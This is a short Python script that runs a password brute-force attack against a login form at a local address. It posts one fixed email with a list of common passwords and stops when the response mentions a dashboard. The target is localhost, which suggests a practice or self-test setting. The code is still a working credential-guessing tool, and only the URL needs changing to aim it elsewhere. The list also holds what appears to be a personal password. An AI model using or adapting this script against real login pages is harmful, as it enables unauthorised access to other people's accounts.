import requests
url = "http://127.0.0.1:5000/login"
email = "Test@gmail.com"
passwords = [
    "123", "1234", "12345", "password", "admin",
    "test123", "qwerty", "letmein", "welcome",
    "password123", "admin123", "Test1111","Test","test1234", "test12345","Allanur2001.", "testpassword", "testadmin"
]
print("Starting brute force attack...\n")
for i, pwd in enumerate(passwords):
    data = {
        "email": email,
        "password": pwd
    }
    response = requests.post(url, data=data)
    print(f"[{i+1}] Trying password: {pwd}")
    if "dashboard" in response.text.lower():
        print("\nFOUND PASSWORD:", pwd)
        break

else:
    print("\nPassword not found.")